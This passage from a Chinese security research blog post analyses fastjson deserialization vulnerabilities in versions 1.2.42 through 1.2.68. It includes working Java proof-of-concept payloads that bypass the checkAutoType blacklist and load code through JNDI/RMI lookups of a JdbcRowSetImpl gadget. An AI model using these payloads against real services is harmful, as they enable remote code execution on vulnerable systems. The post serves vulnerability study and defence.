class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼就看到了两行异常熟悉的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br></pre></td></tr></table></figure><p>我们可以通过一个简单的小<code>demo</code>快速了解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">JdbcRowSetImpl_inc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/ift2ty&quot;</span>);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680704636327-d3f73ea9-ba77-4dae-9497-adf85d3dca46.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=814&id=u2def4e4a&name=image.png&originHeight=1017&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=218638&status=done&style=none&taskId=u0024ec07-8c87-4c38-b19f-5f9cb1d75a7&title=&width=1536" alt="image.png"><br>所以之前的两种<code>poc</code>可以直接自定义<code>uri</code>利用成功。</p><h2 id="3-fastjson-1-2-42-反序列化漏洞"><a href="#3-fastjson-1-2-42-反序列化漏洞" class="headerlink" title="3. fastjson 1.2.42 反序列化漏洞"></a>3. fastjson 1.2.42 反序列化漏洞</h2><p>首先先下载<code>fastjson 1.2.25</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson_1_2_42&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;<span class="number">8</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;<span class="number">8</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-<span class="number">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.42</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680754774564-970f1b59-70ca-4cfa-ac29-fbb87747855f.png#averageHue=%23f8f7f5&clientId=u8272b843-0f56-4&from=paste&height=815&id=u9cfbc8b6&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134211&status=done&style=none&taskId=u4e4b5f20-ee08-46dd-adcd-7d164c8b2ec&title=&width=1536" alt="image.png"><br>直接翻到<code>ParseConfig</code>这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680755033617-ea11aae1-5eda-454b-aae8-2c93e8e84f04.png#averageHue=%23f9f7f3&clientId=u8272b843-0f56-4&from=paste&height=816&id=u45eeb0b7&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216441&status=done&style=none&taskId=ud84d2871-aaef-46e1-8a05-6954235af83&title=&width=1536" alt="image.png"><br>可以看到，<code>fastjson</code>把原来的明文黑名单转换为<code>Hash</code>黑名单，但是并没什么用，目前已经被爆出来了大部分，具体可以参考：</p><blockquote><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p></blockquote><p>然后<code>checkAutoType</code>这里进行判断，仅仅是把原来的<code>L</code>和<code>;</code>换成了<code>hash</code>的形式：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680757094959-6756ef54-ab53-482a-a0af-6a0de63a56f2.png#averageHue=%23f8f6f5&clientId=u8272b843-0f56-4&from=paste&height=815&id=u4ffb3c96&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=212881&status=done&style=none&taskId=u423c075a-9ca0-4619-a344-57be7c09850&title=&width=1536" alt="image.png"><br>所以直接双写<code>L</code>和<code>;</code>即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680758733441-7a33dde7-2108-41f2-96fd-d455192eb9e4.png#averageHue=%23f7f6f3&clientId=u8272b843-0f56-4&from=paste&height=818&id=u6e9e41e8&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=248021&status=done&style=none&taskId=uea7fa118-d959-4194-a205-0006a867a32&title=&width=1536" alt="image.png"></p><h2 id="4-fastjson-1-2-43-反序列化漏洞"><a href="#4-fastjson-1-2-43-反序列化漏洞" class="headerlink" title="4. fastjson 1.2.43 反序列化漏洞"></a>4. fastjson 1.2.43 反序列化漏洞</h2><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.43</code>。<br>直接全局搜索<code>checkAutoType</code>，看修改后的代码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775071552-c2abd2dd-0736-474b-85d5-3d2a0a0f9b3a.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=821&id=u90dbfc03&name=image.png&originHeight=1026&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=195448&status=done&style=none&taskId=ue63da61b-63e3-4de7-b39a-001dcf1df2f&title=&width=1536" alt="image.png"><br>意思就是说如果出现连续的两个<code>L</code>，就报错。那么问题来了，你也妹对<code>[</code>进行限制啊，直接绕：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775167890-7f3f5a07-ae61-44a4-af1e-b73c914599fd.png#averageHue=%23f7f6f5&clientId=u8272b843-0f56-4&from=paste&height=817&id=uc32870ec&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=243628&status=done&style=none&taskId=u84547233-48f3-4771-b061-5712bbd8ebd&title=&width=1536" alt="image.png"></p><h2 id="5-fastjson-1-2-44-mappings缓存导致反序列化漏洞"><a href="#5-fastjson-1-2-44-mappings缓存导致反序列化漏洞" class="headerlink" title="5. fastjson 1.2.44 mappings缓存导致反序列化漏洞"></a>5. fastjson 1.2.44 mappings缓存导致反序列化漏洞</h2><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.44</code>。<br>这个版本的<code>fastjson</code>总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说<code>fastjson 1.2.25</code>版本的第一种<code>poc</code>的那个通过<code>mappings</code>缓存绕过<code>checkAutoType</code>的漏洞，复现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775848153-f5c889aa-82e3-46c6-8875-c6878f5a82f8.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=818&id=udaf4f9c4&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=249270&status=done&style=none&taskId=uc6ecfd51-68b4-4370-b13f-2b095333222&title=&width=1536" alt="image.png"></p><h2 id="6-fastjson-1-2-47-mappings缓存导致反序列化漏洞"><a href="#6-fastjson-1-2-47-mappings缓存导致反序列化漏洞" class="headerlink" title="6. fastjson 1.2.47 mappings缓存导致反序列化漏洞"></a>6. fastjson 1.2.47 mappings缓存导致反序列化漏洞</h2><p>原理同上，<code>payload</code>也同上。复现截图：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680776133861-28037cfe-bb18-4e8a-aaed-7fd1a3e369c6.png#averageHue=%23f7f5f4&clientId=u8272b843-0f56-4&from=paste&height=823&id=ufe14d765&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=256787&status=done&style=none&taskId=u68381a4c-f989-48ee-a8e6-76381ebe60a&title=&width=1536" alt="image.png"></p><h2 id="7-fastjson-1-2-68-反序列化漏洞"><a href="#7-fastjson-1-2-68-反序列化漏洞" class="headerlink" title="7.fastjson 1.2.68 反序列化漏洞"></a>7.fastjson 1.2.68 反序列化漏洞</h2><p><code>fastjson 1.2.47</code>的时候爆出来的这个缓存的漏洞很严重，官方在<code>1.2.48</code>的时候就进行了限制。<br>我们修改上面的<code>pom.xml</code>中<code>fastjson</code>版本为<code>1.2.68</code>。<br>直接翻到<code>MiscCodec</code>这里，可以发现，<code>cache</code>这里默认设置成了<code>false</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680776973783-8ce28666-41b1-46a1-ab62-b6c333f45a0e.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=818&id=uf1c38de7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197671&status=done&style=none&taskId=ud425afd5-487e-427c-9d03-37023aa8493&title=&width=1536" alt="image.png"><br>并且<code>loadClass</code>重载方法的默认的调用改为不缓存：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680777248813-c8b4212a-a968-4c46-a287-ab631daede97.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=815&id=uaa9155ef&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213950&status=done&style=none&taskId=u0f0208c4-7a7f-4868-805d-c0fb6a5048f&title=&width=1536" alt="image.png"><br><code>fastjson 1.2.68</code>的一个亮点就是更新了个<code>safeMode</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680777390863-4080f6fa-2c82-4f4d-abf6-5262756df1bb.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=818&id=u9caf80c7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213569&status=done&style=none&taskId=uf347b2b9-9fdf-4fd7-8104-d2bfe099d43&title=&width=1536" alt="image.png"><br>如果开启了<code>safeMode</code>，那么<code>autoType</code>就会被完全禁止。<br>但是，这个版本有了个新的绕过方式：<code>expectClass</code>。<br>仔细看<code>checkAutoType</code>函数：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680778956318-ac9ae2f8-b2c7-4ce1-9765-f13a975ec8ba.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=u0ebc4421&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207624&status=done&style=none&taskId=u51ffae09-4478-4349-9cfa-30dea94e458&title=&width=1536" alt="image.png"></p><blockquote><p>以下条件的整理参考：<a href="https://blog.csdn.net/mole_exp/article/details/122315526">https://blog.csdn.net/mole_exp&#x2F;article&#x2F;details&#x2F;122315526</a></p></blockquote><p>发现同时满足以下条件的时候，可以绕过<code>checkAutoType</code>：</p><ul><li><code>expectClass</code>不为<code>null</code>，且不等于<code>Object.class</code>、<code>Serializable.class</code>、<code>Cloneable.class</code>、<code>Closeable.class</code>、<code>EventListener.class</code>、<code>Iterable.class</code>、<code>Collection.class</code>；</li><li><code>expectClass</code>需要在缓存集合<code>TypeUtils#mappings</code>中；</li><li><code>expectClass</code>和<code>typeName</code>都不在黑名单中；</li><li><code>typeName</code>不是<code>ClassLoader</code>、<code>DataSource</code>、<code>RowSet</code>的子类；</li><li><code>typeName</code>是<code>expectClass</code>的子类。</li></ul><p>这个<code>expectClass</code>并不是什么陌生的新名词，我们在前置知识里面的<code>demo</code>中的这个<code>Person.class</code>就是期望类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(jsonString2, Person.class);</span><br></pre></td></tr></table></figure><p>但是之前的那些<code>payload</code>执行的时候，期望类这里都是<code>null</code>，那么是哪些地方调用了呢？我们直接全局搜索<code>parser.getConfig().checkAutoType</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779902751-3dbcc23e-48e6-44be-b9cf-b2dc06fe1aa0.png#averageHue=%23f7efe9&clientId=u8272b843-0f56-4&from=paste&height=510&id=ue9a11536&name=image.png&originHeight=637&originWidth=729&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52288&status=done&style=none&taskId=ub780def9-05b0-4ad6-b030-65effb37901&title=&width=583.2" alt="image.png"><br>一个是<code>JavaBeanDeserializer</code>的<code>deserialze</code>这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779685303-8744e9a5-f783-41c1-8c82-25f52f511814.png#averageHue=%23f9f6f5&clientId=u8272b843-0f56-4&from=paste&height=816&id=u2ad5c90a&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=236850&status=done&style=none&taskId=u1f53ea35-31b4-46a9-a19b-963e88f00c4&title=&width=1536" alt="image.png"><br>另一个是<code>ThrowableDeserializer</code>的<code>deserialze</code>这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779966075-84e49d32-ad2c-40fa-9567-a080307c37c9.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=ued608110&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=224876&status=done&style=none&taskId=uff4d739d-577e-4572-805d-944bb078745&title=&width=1536" alt="image.png">具体的分析可以看<code>tr1ple</code>师傅的文章，写的实在是太详细了：</p><blockquote><p><a href="https://www.cnblogs.com/tr1ple/p/13489260.html">https://www.cnblogs.com/tr1ple/p/13489260.html</a></p></blockquote><h1 id="四、参考与致谢"><a href="#四、参考与致谢" class="headerlink" title="四、参考与致谢"></a>四、参考与致谢</h1><p>我在学习<code>fastjson</code>漏洞的时候，阅读参考了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出！也十分感谢<code>4ra1n</code>师傅和<code>su18</code>师傅热情地回答我一个<code>Java</code>初学者提出的可能有点傻的问题。（笑）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.anquanke.com/post/id/248892</span></span><br><span class="line">https:<span class="comment">//paper.seebug.org/1698/</span></span><br><span class="line">https:<span class="comment">//www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/</span></span><br><span class="line">https:<span class="comment">//www.rc.sb/fastjson/</span></span><br><span class="line">https:<span class="comment">//drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl利用链/</span></span><br><span class="line">https:<span class="comment">//blog.weik1.top/2021/09/08/Fastjson 反序列化历史漏洞分析/</span></span><br><span class="line">http:<span class="comment">//blog.topsec.com.cn/fastjson-1-2-24反序列化漏洞深度分析/</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7107</span></span><br><span class="line">https:<span class="comment">//www.javasec.org/java-vuls/FastJson.html</span></span><br><span class="line">https:<span class="comment">//www.freebuf.com/articles/web/265904.html</span></span><br><span class="line">https:<span class="comment">//b1ue.cn/archives/506.html</span></span><br><span class="line">http:<span class="comment">//xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/</span></span><br><span class="line">https:<span class="comment">//forum.butian.net/share/1092</span></span><br><span class="line">https:<span class="comment">//www.freebuf.com/vuls/178012.html</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14776043.html</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14601670.html</span></span><br><span class="line">http:<span class="comment">//140.143.242.46/blog/024.html</span></span><br><span class="line">https:<span class="comment">//paper.seebug.org/994/</span></span><br><span class="line">https:<span class="comment">//paper.seebug.org/1192/</span></span><br><span class="line">http:<span class="comment">//xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/</span></span><br><span class="line">https:<span class="comment">//zhuanlan.zhihu.com/p/544463507</span></span><br><span class="line">https:<span class="comment">//jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/</span></span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/240446</span></span><br><span class="line">https:<span class="comment">//yaklang.io/products/article/yakit-technical-study/fast-Json/</span></span><br><span class="line">https:<span class="comment">//su18.org/post/fastjson/#2-fastjson-1225</span></span><br><span class="line">https:<span class="comment">//cloud.tencent.com/developer/article/1957185</span></span><br><span class="line">https:<span class="comment">//yaklang.io/products/article/yakit-technical-study/fast-Json</span></span><br><span class="line">https:<span class="comment">//developer.aliyun.com/article/842073</span></span><br><span class="line">http:<span class="comment">//wjlshare.com/archives/1526</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/9052#toc-16</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/Adminxe/article/details/105918000</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/q20010619/article/details/123155767</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7027#toc-3</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7027#toc-5</span></span><br><span class="line">https:<span class="comment">//www.sec-in.com/article/950</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7027#toc-14</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14776043.html#1225-1241-绕过</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14776043.html#1225版本修复</span></span><br><span class="line">https:<span class="comment">//y4er.com/posts/fastjson-1.2.80/#回顾fastjson历史漏洞</span></span><br><span class="line">https:<span class="comment">//github.com/su18/hack-fastjson-1.2.80</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/mole_exp/article/details/122315526</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/ph4nt0mer/p/13065373.html</span></span><br><span class="line">https:<span class="comment">//alewong.github.io/2020/09/14/Fastjson-1-2-68版本反序列化漏洞分析篇/</span></span><br><span class="line">https:<span class="comment">//kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</span></span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/225439</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
